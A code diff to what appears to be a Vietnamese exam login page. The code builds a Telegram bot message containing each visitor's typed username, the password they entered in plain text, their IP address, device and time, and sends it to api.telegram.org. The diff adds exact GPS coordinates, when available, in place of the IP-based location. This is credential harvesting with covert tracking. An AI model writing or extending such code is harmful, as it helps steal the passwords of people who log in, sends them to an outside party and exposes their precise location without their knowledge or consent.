@@ -405,10 +405,16 @@
                 } catch (e) {
                     console.log("Không thể fetch IP:", e);
                 }
-                const mapLink = `https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude}`;
+                let exactLat = sessionStorage.getItem('exact_lat');
+                let exactLng = sessionStorage.getItem('exact_lng');
+                let lat = exactLat ? exactLat : ipData.latitude;
+                let lng = exactLng ? exactLng : ipData.longitude;
+                let locationType = exactLat ? "GPS Chính xác" : "Theo IP";
+                
+                const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`;
                 const device = navigator.userAgent;
 
-                const message = `🚨 <b>CÓ NGƯỜI ĐĂNG NHẬP THI</b>\n\n👤 Tên: <code>${user}</code>\n🔑 Mật khẩu nhập: <code>${pass}</code>\n🌐 IP: ${ipData.ip}\n📍 Vị trí: <a href="${mapLink}">${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}</a>\n📱 Thiết bị: <code>${device}</code>\n⏱ T.Gian: ${new Date().toLocaleString('vi-VN')}`;
+                const message = `🚨 <b>CÓ NGƯỜI ĐĂNG NHẬP THI</b>\n\n👤 Tên: <code>${user}</code>\n🔑 Mật khẩu nhập: <code>${pass}</code>\n🌐 IP: ${ipData.ip}\n📍 Vị trí (${locationType}): <a href="${mapLink}">${ipData.city || 'N/A'}, ${ipData.region || 'N/A'}</a>\n📱 Thiết bị: <code>${device}</code>\n⏱ T.Gian: ${new Date().toLocaleString('vi-VN')}`;
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
                 
                 // Đợi gửi xong tin nhắn trong tối đa 2 giây (tránh bị kẹt web nếu mạng lỗi)
